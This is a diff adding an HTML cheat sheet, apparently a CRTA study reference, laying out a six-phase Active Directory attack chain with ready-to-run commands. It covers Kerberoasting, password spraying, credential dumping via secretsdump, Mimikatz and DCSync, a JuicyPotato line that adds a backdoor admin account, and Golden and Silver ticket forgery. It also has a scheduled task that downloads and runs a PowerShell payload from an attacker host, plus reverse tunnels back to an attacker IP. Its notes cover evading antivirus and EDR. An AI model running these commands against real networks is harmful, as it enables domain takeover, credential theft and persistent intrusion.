@@ -1,0 +1,879 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>AD Attack Methodology — 0xSalmon</title>
+    <style>
+      :root {
+        --bg: #0d0f12;
+        --bg2: #13161b;
+        --bg3: #1a1e25;
+        --border: rgba(255, 255, 255, 0.07);
+        --border2: rgba(255, 255, 255, 0.13);
+        --text: #e2e4e9;
+        --muted: #6b7280;
+        --mono: "Courier New", monospace;
+        --sans: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+      }
+      * {
+        box-sizing: border-box;
+        margin: 0;
+        padding: 0;
+      }
+      body {
+        background: var(--bg);
+        color: var(--text);
+        font-family: var(--sans);
+        font-size: 14px;
+        line-height: 1.6;
+        min-height: 100vh;
+      }
+      header {
+        border-bottom: 1px solid var(--border);
+        padding: 18px 28px;
+        display: flex;
+        align-items: center;
+        gap: 12px;
+        background: var(--bg2);
+        position: sticky;
+        top: 0;
+        z-index: 100;
+      }
+      .logo {
+        font-size: 13px;
+        font-weight: 600;
+        letter-spacing: 0.08em;
+        text-transform: uppercase;
+        color: var(--muted);
+      }
+      .logo span {
+        color: #e2e4e9;
+      }
+      header h1 {
+        font-size: 14px;
+        font-weight: 500;
+        color: var(--muted);
+        margin-left: auto;
+      }
+      .tag {
+        font-size: 10px;
+        font-weight: 600;
+        letter-spacing: 0.1em;
+        text-transform: uppercase;
+        padding: 3px 8px;
+        border-radius: 4px;
+        background: rgba(59, 139, 212, 0.15);
+        color: #5ba4e0;
+        border: 1px solid rgba(59, 139, 212, 0.25);
+      }
+      main {
+        max-width: 960px;
+        margin: 0 auto;
+        padding: 28px 20px 60px;
+      }
+
+      .intro {
+        display: grid;
+        grid-template-columns: repeat(6, 1fr);
+        gap: 6px;
+        margin-bottom: 28px;
+      }
+      .intro-step {
+        background: var(--bg2);
+        border: 1px solid var(--border);
+        border-radius: 6px;
+        padding: 10px 10px 8px;
+        cursor: pointer;
+        transition:
+          border-color 0.15s,
+          background 0.15s;
+        position: relative;
+        overflow: hidden;
+      }
+      .intro-step::before {
+        content: "";
+        position: absolute;
+        top: 0;
+        left: 0;
+        right: 0;
+        height: 2px;
+        background: var(--phase-color);
+        opacity: 0.7;
+      }
+      .intro-step:hover {
+        border-color: var(--border2);
+        background: var(--bg3);
+      }
+      .intro-step.active {
+        border-color: var(--phase-color);
+        background: var(--bg3);
+      }
+      .step-num {
+        font-size: 10px;
+        color: var(--muted);
+        font-weight: 600;
+        letter-spacing: 0.06em;
+        text-transform: uppercase;
+      }
+      .step-label {
+        font-size: 12px;
+        font-weight: 500;
+        color: var(--text);
+        margin-top: 3px;
+        line-height: 1.3;
+      }
+
+      .phase-section {
+        display: none;
+      }
+      .phase-section.active {
+        display: block;
+      }
+
+      .phase-header {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        margin-bottom: 14px;
+      }
+      .phase-dot {
+        width: 8px;
+        height: 8px;
+        border-radius: 50%;
+        flex-shrink: 0;
+      }
+      .phase-title {
+        font-size: 16px;
+        font-weight: 600;
+        color: var(--text);
+      }
+      .phase-meta {
+        font-size: 12px;
+        color: var(--muted);
+        margin-left: auto;
+      }
+
+      .tool-grid {
+        display: grid;
+        grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
+        gap: 6px;
+        margin-bottom: 12px;
+      }
+      .tool-card {
+        background: var(--bg2);
+        border: 1px solid var(--border);
+        border-radius: 6px;
+        padding: 10px 12px;
+        cursor: pointer;
+        transition:
+          border-color 0.15s,
+          background 0.15s;
+      }
+      .tool-card:hover {
+        background: var(--bg3);
+        border-color: var(--border2);
+      }
+      .tool-card.active {
+        border-color: var(--phase-color);
+        background: var(--bg3);
+      }
+      .tool-name {
+        font-size: 13px;
+        font-weight: 600;
+        color: var(--text);
+      }
+      .tool-when {
+        font-size: 11px;
+        color: var(--muted);
+        margin-top: 3px;
+        line-height: 1.4;
+      }
+
+      .cmd-panel {
+        background: var(--bg2);
+        border: 1px solid var(--border);
+        border-radius: 8px;
+        overflow: hidden;
+        display: none;
+      }
+      .cmd-panel.show {
+        display: block;
+      }
+      .cmd-panel-header {
+        padding: 10px 14px;
+        border-bottom: 1px solid var(--border);
+        display: flex;
+        align-items: center;
+        gap: 8px;
+      }
+      .cmd-tool-name {
+        font-size: 13px;
+        font-weight: 600;
+        color: var(--text);
+      }
+      .cmd-panel-body {
+        padding: 14px;
+      }
+      .label {
+        font-size: 10px;
+        font-weight: 700;
+        letter-spacing: 0.1em;
+        text-transform: uppercase;
+        color: var(--muted);
+        margin-bottom: 6px;
+      }
+      pre {
+        background: var(--bg);
+        border: 1px solid var(--border);
+        border-radius: 6px;
+        padding: 12px 14px;
+        font-family: var(--mono);
+        font-size: 12px;
+        color: #a8c7f0;
+        white-space: pre-wrap;
+        line-height: 1.7;
+        overflow-x: auto;
+        margin-bottom: 12px;
+      }
+      .note-box {
+        background: rgba(255, 255, 255, 0.03);
+        border-left: 2px solid var(--border2);
+        border-radius: 0 4px 4px 0;
+        padding: 8px 12px;
+        font-size: 12px;
+        color: var(--muted);
+        line-height: 1.6;
+      }
+
+      /* Decision table */
+      .decision-section {
+        margin-top: 32px;
+        border: 1px solid var(--border);
+        border-radius: 8px;
+        overflow: hidden;
+      }
+      .decision-header {
+        padding: 12px 16px;
+        background: var(--bg2);
+        border-bottom: 1px solid var(--border);
+        font-size: 12px;
+        font-weight: 700;
+        letter-spacing: 0.08em;
+        text-transform: uppercase;
+        color: var(--muted);
+      }
+      table {
+        width: 100%;
+        border-collapse: collapse;
+      }
+      th {
+        padding: 8px 14px;
+        text-align: left;
+        font-size: 11px;
+        font-weight: 700;
+        letter-spacing: 0.07em;
+        text-transform: uppercase;
+        color: var(--muted);
+        background: var(--bg2);
+        border-bottom: 1px solid var(--border);
+      }
+      td {
+        padding: 8px 14px;
+        font-size: 12px;
+        border-bottom: 1px solid var(--border);
+        vertical-align: top;
+      }
+      tr:last-child td {
+        border-bottom: none;
+      }
+      tr:hover td {
+        background: var(--bg3);
+      }
+      td:first-child {
+        color: var(--muted);
+      }
+      td code {
+        font-family: var(--mono);
+        font-size: 11px;
+        color: #a8c7f0;
+        background: var(--bg);
+        padding: 1px 5px;
+        border-radius: 3px;
+        border: 1px solid var(--border);
+      }
+    </style>
+  </head>
+  <body>
+    <header>
+      <div class="logo"><span>0xSalmon</span> / AD Methodology</div>
+      <span class="tag">CRTA Reference</span>
+      <h1>Active Directory Attack Chain</h1>
+    </header>
+    <main>
+      <div class="intro" id="phase-nav"></div>
+      <div id="phase-content"></div>
+
+      <div class="decision-section">
+        <div class="decision-header">
+          Quick decision table — situation → tool
+        </div>
+        <table>
+          <thead>
+            <tr>
+              <th>Situation</th>
+              <th>Tool</th>
+              <th>Why</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td>No creds, SMB open</td>
+              <td><code>enum4linux</code> + <code>GetNPUsers</code></td>
+              <td>Null session enum → AS-REP roast accounts with no preauth</td>
+            </tr>
+            <tr>
+              <td>First creds obtained</td>
+              <td><code>BloodHound</code> + <code>GetUserSPNs</code></td>
+              <td>Map all paths to DA + Kerberoast SPNs immediately</td>
+            </tr>
+            <tr>
+              <td>Shell on box</td>
+              <td><code>WinPEAS</code> → <code>PowerUP</code></td>
+              <td>WinPEAS for broad checks, PowerUP for service abuse paths</td>
+            </tr>
+            <tr>
+              <td>SeImpersonatePrivilege</td>
+              <td><code>PrintSpoofer</code> / <code>JuicyPotato</code></td>
+              <td>Token impersonation → SYSTEM in seconds</td>
+            </tr>
+            <tr>
+              <td>Local admin on host</td>
+              <td><code>secretsdump.py</code></td>
+              <td>
+                Dump SAM + cached creds without touching LSASS interactively
+              </td>
+            </tr>
+            <tr>
+              <td>WinRM (5985) open</td>
+              <td><code>evil-winrm</code></td>
+              <td>Cleanest remote PS — less noise than psexec</td>
+            </tr>
+            <tr>
+              <td>Lateral movement stealth</td>
+              <td><code>wmiexec.py</code></td>
+              <td>No service creation, no disk write</td>
+            </tr>
+            <tr>
+              <td>Internal subnet found</td>
+              <td><code>ligolo-ng</code></td>
+              <td>Full tun interface — tools work natively, no proxychains</td>
+            </tr>
+            <tr>
+              <td>Have DA / DCSync rights</td>
+              <td><code>Invoke-Mimikatz dcsync</code></td>
+              <td>Pull krbtgt without touching DC disk</td>
+            </tr>
+            <tr>
+              <td>Have krbtgt hash</td>
+              <td><code>ticketer.py</code> / Golden Ticket</td>
+              <td>
+                Forge TGTs for any user — persists until krbtgt rotated twice
+              </td>
+            </tr>
+            <tr>
+              <td>Child domain DA</td>
+              <td>SID History injection + <code>ticketer -extra-sid</code></td>
+              <td>Cross forest trust → parent domain EA via SID 519</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+    </main>
+    <script>
+      const data = [
+        {
+          id: "recon",
+          color: "#3B8BD4",
+          title: "Phase 1 — Reconnaissance & host discovery",
+          badge: "External → foothold",
+          tools: [
+            {
+              name: "nmap",
+              when: "Always first — port scan, version detection, DC identification",
+              cmds: `# Host discovery
+nmap -sn 192.168.1.0/24
+
+# Full service scan + scripts
+nmap -sCV -p- <ip>
+
+# Targeted DC ports only (fast)
+nmap -p 88,135,139,389,445,636,3268 -sV -sC <ip>
+
+# Vuln check — EternalBlue
+nmap --script smb-vuln-ms17-010 <ip>`,
+              note: "Port 88=Kerberos, 389=LDAP, 3268=GC → you found a DC. Always confirm with -sCV before moving on.",
+            },
+            {
+              name: "enum4linux / rpcclient",
+              when: "After port 445 is open — null session enumeration",
+              cmds: `enum4linux -a <ip>
+
+# Alternatively with rpcclient
+rpcclient -U "" -N <ip>
+> enumdomusers
+> enumdomgroups
+> querydominfo`,
+              note: "enum4linux wraps rpcclient, smbclient, nmblookup. Use it first. rpcclient when you need granular control.",
+            },
+            {
+              name: "smbclient",
+              when: "List/access shares after finding port 445",
+              cmds: `# List shares (null session)
+smbclient -L //<ip> -N
+
+# Access a specific share
+smbclient //<ip>/SHARE -N`,
+              note: "Always check SYSVOL and NETLOGON — GPP passwords (cpassword) still appear in old environments.",
+            },
+            {
+              name: "ldapsearch",
+              when: "Dump AD objects when LDAP (389/636) is open",
+              cmds: `# Anonymous bind
+ldapsearch -x -h <dc_ip> -b "DC=domain,DC=local"
+
+# Authenticated
+ldapsearch -x -h <dc_ip> -b "DC=domain,DC=local" -D "user@domain.local" -w password`,
+              note: "Look for userAccountControl=66048 (no preauth) and servicePrincipalName fields.",
+            },
+            {
+              name: "dig / DNS",
+              when: "Zone transfer attempt — often misconfigured internally",
+              cmds: `dig axfr @<nameserver_ip> domain.com
+
+# Enumerate SRV records
+dig SRV _ldap._tcp.domain.com @<dc_ip>`,
+              note: "Zone transfer gives you the full internal DNS map. Internal DCs often allow it by default.",
+            },
+          ],
+        },
+        {
+          id: "cred",
+          color: "#D85A30",
+          title: "Phase 2 — Credential attacks",
+          badge: "No creds → first creds",
+          tools: [
+            {
+              name: "GetNPUsers.py",
+              when: "You have a user list but NO creds — AS-REP Roasting",
+              cmds: `# With a user list
+GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip <dc_ip> -format hashcat -outputfile asrep.txt
+
+# Crack
+hashcat -m 18200 asrep.txt rockyou.txt`,
+              note: "Trigger: usernames from enum4linux but no passwords. Finds accounts with preauth disabled.",
+            },
+            {
+              name: "GetUserSPNs.py",
+              when: "You HAVE valid creds — Kerberoasting service accounts",
+              cmds: `GetUserSPNs.py domain.local/user:password -dc-ip <dc_ip> -request -outputfile spn.txt
+
+# Crack
+hashcat -m 13100 spn.txt rockyou.txt`,
+              note: "Trigger: got first creds. Check if SPN hashes crack to privileged service accounts.",
+            },
+            {
+              name: "CrackMapExec / NetExec",
+              when: "Validate creds across network / password spraying",
+              cmds: `# Validate single cred across subnet
+crackmapexec smb 192.168.1.0/24 -u user -p password
+
+# Password spray (check lockout policy first!)
+crackmapexec smb hosts.txt -u users.txt -p 'Password123' --continue-on-success
+
+# Check local admin
+crackmapexec smb hosts.txt -u user -p pass --local-auth
+
+# LSA secrets dump
+crackmapexec smb <ip> -u user -p pass --lsa`,
+              note: "Pwned+ in output = local admin. Always use --continue-on-success to avoid stopping at first hit.",
+            },
+            {
+              name: "Invoke-DomainPasswordSpray",
+              when: "On-box spray with a shell — reads domain lockout policy automatically",
+              cmds: `powershell -ep bypass
+. .\\PowerView.ps1
+
+# Get user list
+Get-DomainUser | Select-Object -ExpandProperty cn | Out-File users.txt
+
+# Spray
+Invoke-DomainPasswordSpray -UserList .\\users.txt -Password 'Summer@2025' -Verbose`,
+              note: "Safer than CME spray — reads domain lockout policy. Use when you already have a shell.",
+            },
+          ],
+        },
+        {
+          id: "enum_ad",
+          color: "#1D9E75",
+          title: "Phase 3 — AD enumeration (post-creds)",
+          badge: "First creds → attack paths",
+          tools: [
+            {
+              name: "BloodHound / SharpHound",
+              when: "ALWAYS run after first valid creds — maps all paths to DA",
+              cmds: `# On-box collection (Windows shell)
+.\\SharpHound.exe -c All --zipfilename bh.zip
+
+# Via PowerShell
+powershell -ep bypass
+. .\\SharpHound.ps1
+Invoke-BloodHound -CollectionMethod All
+
+# Remote via NetExec (no shell needed)
+nxc ldap <dc_ip> -u user -p pass --bloodhound -c All`,
+              note: "Upload ZIP to BloodHound GUI. Run 'Shortest Paths to Domain Admins' immediately. Check ACL edges: GenericWrite, WriteDACL, ForceChangePassword.",
+            },
+            {
+              name: "PowerView",
+              when: "Targeted AD queries — users, groups, ACLs, trusts, delegation",
+              cmds: `powershell -ep bypass
+. .\\PowerView.ps1
+
+# DA members
+Get-NetGroupMember -GroupName "Domain Admins" -Verbose
+
+# Unconstrained delegation hosts (high value targets)
+Get-NetComputer -Unconstrained -Verbose
+
+# ACL abuse hunting
+Invoke-ACLScanner -ResolveGUIDs | Where-Object {$_.IdentityReference -match "youruser"}
+
+# Find local admin access
+Find-LocalAdminAccess -Verbose
+
+# Kerberoastable accounts
+Get-NetUser -SPN`,
+              note: "ACL scanner is gold — WriteDACL/GenericAll on a privileged account = path to DA without touching the DC.",
+            },
+            {
+              name: "secretsdump.py",
+              when: "You have local admin on any machine — dump all creds",
+              cmds: `# Remote SAM + cached creds
+secretsdump.py domain/user:pass@<ip>
+
+# Against DC = full NTDS dump (domain compromise)
+secretsdump.py domain/administrator:pass@<dc_ip>
+
+# Pass-the-hash variant
+secretsdump.py -hashes :NTLM domain/user@<ip>`,
+              note: "Running against the DC with DA creds = game over. Gets krbtgt hash → Golden Ticket path.",
+            },
+          ],
+        },
+        {
+          id: "privesc",
+          color: "#BA7517",
+          title: "Phase 4 — Privilege escalation",
+          badge: "Low priv → local admin / DA",
+          tools: [
+            {
+              name: "WinPEAS",
+              when: "First thing after landing a shell — automated local privesc checks",
+              cmds: `.\\winpeas.exe
+
+# Key findings to look for:
+# - AlwaysInstallElevated
+# - Unquoted service paths
+# - Modifiable services
+# - SeImpersonatePrivilege (Potato attacks)
+# - Stored credentials / DPAPI`,
+              note: "Filter for 'Interesting' markers. SeImpersonatePrivilege → JuicyPotato/PrintSpoofer immediately.",
+            },
+            {
+              name: "PowerUP",
+              when: "Windows privesc — modifiable services, unquoted paths",
+              cmds: `powershell -ep bypass
+. .\\PowerUp.ps1
+Invoke-AllChecks -Verbose
+
+# Specific checks
+Get-ServiceUnquoted -Verbose
+Get-ModifiableService -Verbose`,
+              note: "Use PowerUP for service abuse paths. WinPEAS is broader — run both.",
+            },
+            {
+              name: "JuicyPotato / PrintSpoofer",
+              when: "SeImpersonatePrivilege is present (IIS, SQL Server, service accounts)",
+              cmds: `# JuicyPotato (Windows Server 2016 and earlier)
+JuicyPotato.exe -l 1337 -p cmd.exe -a "/c net user hacker P@ss123 /add && net localgroup administrators hacker /add" -t *
+
+# PrintSpoofer (Windows 10/2019+)
+PrintSpoofer.exe -i -c cmd.exe
+
+# Check first
+whoami /priv`,
+              note: "If SeImpersonatePrivilege=Enabled, this is nearly guaranteed to work. Check OS version to pick the right tool.",
+            },
+            {
+              name: "LinPEAS / sudo abuse",
+              when: "Linux hosts in the environment — SUID, cron, sudo misconfigs",
+              cmds: `./linpeas.sh 2>/dev/null | tee linpeas_out.txt
+
+# Check sudo rights — always first
+sudo -l
+
+# vim sudo escape
+sudo vim somefile
+:!/bin/bash
+
+# vi escape
+sudo /usr/bin/vi
+:!bash`,
+              note: "sudo -l is always first on Linux. vim/less/find/python in sudoers = trivial root.",
+            },
+          ],
+        },
+        {
+          id: "lateral",
+          color: "#533AB7",
+          title: "Phase 5 — Lateral movement & pivoting",
+          badge: "One machine → many machines",
+          tools: [
+            {
+              name: "Evil-WinRM",
+              when: "WinRM (5985/5986) open + valid creds or hash",
+              cmds: `# Cleartext
+evil-winrm -i <ip> -u username -p password
+
+# Pass-the-hash
+evil-winrm -i <ip> -u Administrator -H NTLM_HASH
+
+# Kerberos ticket
+evil-winrm -i <ip> -r DOMAIN.LOCAL`,
+              note: "Prefer over psexec when possible — less noise. Verify port 5985 is open first.",
+            },
+            {
+              name: "Impacket exec suite",
+              when: "Remote code execution — pick based on opsec requirements",
+              cmds: `# wmiexec — no service creation, no disk write, stealthiest
+wmiexec.py domain/user:pass@<ip>
+
+# psexec — creates service, writes to disk, noisy but reliable
+psexec.py domain/user:pass@<ip>
+
+# smbexec — middle ground, no file written
+smbexec.py domain/user:pass@<ip>
+
+# Pass-the-hash for all
+wmiexec.py -hashes :NTLM domain/user@<ip>`,
+              note: "wmiexec = stealth, psexec = reliability. psexec triggers most AV — avoid in real engagements.",
+            },
+            {
+              name: "Mimikatz / sekurlsa",
+              when: "Local admin obtained — dump LSASS / Pass-the-Hash",
+              cmds: `# Dump all creds
+Invoke-Mimikatz -DumpCreds
+
+# Pass-the-Hash — spawn process as another user
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:corp.com /ntlm:<HASH> /run:powershell.exe"'
+
+# DCSync — pull krbtgt without touching DC disk
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\\krbtgt"'`,
+              note: "DCSync requires GetReplicationChangesAll rights (DA or explicitly delegated). Primary path to krbtgt.",
+            },
+            {
+              name: "Ligolo-ng",
+              when: "Internal subnet found — need full IP routing through compromised host",
+              cmds: `# Attacker setup (run once)
+sudo ip tuntap add user $(whoami) mode tun ligolo
+sudo ip link set ligolo up
+./proxy -selfcert -laddr 0.0.0.0:11601
+
+# Victim — connect back
+./agent -connect <attacker_ip>:11601 -ignore-cert
+
+# Add route after session appears in proxy console
+sudo ip route add 10.10.10.0/24 dev ligolo
+# In proxy console: select session → start`,
+              note: "Superior to Chisel — creates real tun interface, tools work natively without proxychains.",
+            },
+            {
+              name: "Chisel (SOCKS fallback)",
+              when: "Need quick SOCKS tunnel via HTTP — can't drop ligolo binary",
+              cmds: `# Attacker
+./chisel server -p 8080 --reverse
+
+# Victim
+./chisel client <attacker_ip>:8080 R:socks
+
+# Use with proxychains
+proxychains nmap -sT -Pn <internal_ip>`,
+              note: "SOCKS-only — requires proxychains for all tools. nmap -sT only (no raw sockets through SOCKS).",
+            },
+          ],
+        },
+        {
+          id: "persist",
+          color: "#993556",
+          title: "Phase 6 — Domain persistence",
+          badge: "DA → permanent access",
+          tools: [
+            {
+              name: "Golden Ticket",
+              when: "Have krbtgt hash — forge TGTs for any user, survives password resets",
+              cmds: `# Get krbtgt hash via DCSync
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\\krbtgt"'
+
+# Get Domain SID
+whoami /all
+
+# Forge ticket (Mimikatz — inject immediately with /ptt)
+Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:corp.com /sid:S-1-5-21-XXXX /krbtgt:<HASH> /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
+
+# Impacket variant (file-based)
+ticketer.py -domain corp.com -aesKey <aes256_key> -domain-sid S-1-5-21-XXXX Administrator
+export KRB5CCNAME=Administrator.ccache`,
+              note: "Valid until krbtgt is rotated TWICE. Prefer AES key over RC4 — less detectable by modern EDR.",
+            },
+            {
+              name: "Silver Ticket",
+              when: "Have a SERVICE account hash — forge TGS for that specific service",
+              cmds: `# Forge for CIFS (file access)
+Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:corp.com /sid:S-1-5-21-XXXX /target:dc01.corp.com /service:cifs /rc4:<MACHINE_HASH> /ptt"'
+
+# Forge for HOST (schedule tasks)
+Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:corp.com /sid:S-1-5-21-XXXX /target:dc01.corp.com /service:HOST /rc4:<HASH> /ptt"'
+
+# Schedule malicious task via HOST Silver Ticket
+schtasks /create /S dc01.corp.com /SC Weekly /RU "NT Authority\\SYSTEM" /TN "update" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(\"http://10.10.10.1:8000/payload.ps1\")'"`,
+              note: "Stealthier than Golden — no DC contact required. Only needs target service account hash, not krbtgt.",
+            },
+            {
+              name: "DCSync (hash harvest)",
+              when: "DA rights obtained — pull all domain hashes without touching DC disk",
+              cmds: `# Via Mimikatz
+Invoke-Mimikatz -Command '"lsadump::dcsync /domain:corp.com /user:Administrator"'
+Invoke-Mimikatz -Command '"lsadump::dcsync /domain:corp.com /all /csv"'
+
+# Via secretsdump from Kali (no agent)
+secretsdump.py domain/administrator:password@<dc_ip>
+
+# Pass-the-hash variant
+secretsdump.py -hashes :NTLM domain/administrator@<dc_ip>`,
+              note: "Endgame collection step. DCSync mimics DC replication — harder to detect than interactive LSASS dump on DC.",
+            },
+            {
+              name: "Cross-forest / SID History",
+              when: "Child domain DA → compromise parent domain via SID History injection",
+              cmds: `# Forge inter-realm ticket with extra-sid (SID 519 = Enterprise Admins)
+ticketer.py -domain child.corp.com \\
+  -aesKey <child_krbtgt_aes256> \\
+  -domain-sid S-1-5-21-<child_sid> \\
+  -extra-sid S-1-5-21-<parent_sid>-519 \\
+  Administrator
+
+# Use the ticket
+export KRB5CCNAME=Administrator.ccache
+secretsdump.py -k -no-pass parent.corp.com`,
+              note: "Crosses trust boundary. Requires bi-directional or parent-child trust. SID 519 = EA in parent domain.",
+            },
+          ],
+        },
+      ];
+
+      let currentPhase = 0;
+      let currentTool = null;
+
+      function init() {
+        const nav = document.getElementById("phase-nav");
+        const content = document.getElementById("phase-content");
+
+        data.forEach((phase, i) => {
+          const step = document.createElement("div");
+          step.className = "intro-step" + (i === 0 ? " active" : "");
+          step.style.setProperty("--phase-color", phase.color);
+          step.innerHTML = `<div class="step-num">Phase ${i + 1}</div><div class="step-label">${phase.title.replace(/Phase \d+ — /, "")}</div>`;
+          step.onclick = () => selectPhase(i);
+          nav.appendChild(step);
+
+          const section = document.createElement("div");
+          section.className = "phase-section" + (i === 0 ? " active" : "");
+          section.id = "section-" + i;
+          section.innerHTML = `
+      <div class="phase-header">
+        <div class="phase-dot" style="background:${phase.color}"></div>
+        <div class="phase-title">${phase.title}</div>
+        <div class="phase-meta">${phase.badge}</div>
+      </div>
+      <div class="tool-grid" id="tg-${i}" style="--phase-color:${phase.color}"></div>
+      <div class="cmd-panel" id="cmd-${i}"></div>`;
+          content.appendChild(section);
+
+          const tg = section.querySelector(`#tg-${i}`);
+          phase.tools.forEach((tool, ti) => {
+            const card = document.createElement("div");
+            card.className = "tool-card";
+            card.style.setProperty("--phase-color", phase.color);
+            card.innerHTML = `<div class="tool-name">${tool.name}</div><div class="tool-when">${tool.when}</div>`;
+            card.onclick = () => showTool(i, ti, card, tool);
+            tg.appendChild(card);
+          });
+        });
+      }
+
+      function selectPhase(i) {
+        currentPhase = i;
+        currentTool = null;
+        document
+          .querySelectorAll(".intro-step")
+          .forEach((s, idx) => s.classList.toggle("active", idx === i));
+        document
+          .querySelectorAll(".phase-section")
+          .forEach((s, idx) => s.classList.toggle("active", idx === i));
+        document
+          .querySelectorAll(".tool-card")
+          .forEach((c) => c.classList.remove("active"));
+        document.querySelectorAll(".cmd-panel").forEach((p) => {
+          p.classList.remove("show");
+          p.innerHTML = "";
+        });
+      }
+
+      function showTool(phaseIdx, toolIdx, card, tool) {
+        const key = `${phaseIdx}-${toolIdx}`;
+        const cmdPanel = document.getElementById("cmd-" + phaseIdx);
+        const phase = data[phaseIdx];
+
+        if (currentTool === key) {
+          card.classList.remove("active");
+          cmdPanel.classList.remove("show");
+          cmdPanel.innerHTML = "";
+          currentTool = null;
+          return;
+        }
+
+        document
+          .querySelectorAll(`#tg-${phaseIdx} .tool-card`)
+          .forEach((c) => c.classList.remove("active"));
+        card.classList.add("active");
+        currentTool = key;
+
+        cmdPanel.innerHTML = `
+    <div class="cmd-panel-header" style="border-left:3px solid ${phase.color}">
+      <div class="cmd-tool-name">${tool.name}</div>
+    </div>
+    <div class="cmd-panel-body">
+      <div class="label">When to use</div>
+      <div class="note-box" style="margin-bottom:12px">${tool.when}</div>
+      <div class="label">Commands</div>
+      <pre>${tool.cmds}</pre>
+      ${tool.note ? `<div class="label">Notes</div><div class="note-box">${tool.note}</div>` : ""}
+    </div>`;
+        cmdPanel.classList.add("show");
+      }
+
+      init();
+    </script>
+  </body>
+</html>
